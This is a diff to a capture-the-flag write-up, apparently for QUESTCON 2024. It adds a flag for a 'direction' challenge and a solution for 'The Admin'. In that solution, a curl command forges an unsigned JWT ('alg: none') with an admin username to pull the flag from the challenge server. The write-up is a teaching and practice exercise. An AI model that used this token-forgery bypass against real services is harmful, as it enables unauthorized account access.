@@ -39,6 +39,38 @@
 
 ![image](https://github.com/user-attachments/assets/05c38c13-3f18-4440-bf62-8606f38c8a79)
 
+- I wrote a <a href="https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/QUESTcon24/scripts/direction.py">script</a> to automate it.
+
+![image](https://github.com/user-attachments/assets/60983022-c410-4d09-9247-07294c1cdd14)
+
+- Flag-: ```QUESTCON{mi3d1r3ct10n_15_4n_4r}```
+
+
+-------------------
+
+### Challenge 2: The Admin
+
+![image](https://github.com/user-attachments/assets/2c893638-2ee5-4086-ba07-333a1ee1d40a)
+
+- The index page contains the documentation for the api.Route `auth` takes in a username and returns a jwt token created with the username and route `access` takes in the cookie and displays the username.
+
+![image](https://github.com/user-attachments/assets/0ca83b87-c8b8-4164-82f7-35f0b1b0180b)
+
+![image](https://github.com/user-attachments/assets/d985d91e-3733-4d32-9587-6719bc838327)
+
+- I was able to get the flag by setting the `alg` key to `none`.
+
+```bash
+curl https://questcon-theadmin.chals.io/access -H "Authorization: Bearer $(echo '{"alg":"none","typ":"JWT"}' | base64).eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzI5ODYwNTM2fQ"
+{"flag":"QUESTCON{J3T_4lg0r1thm_15_vuln3r4bl3_70_n0n3}"}%
+```
+
+- Flag-:```QUESTCON{J3T_4lg0r1thm_15_vuln3r4bl3_70_n0n3}```
+
+
+
+
+
 
 
 
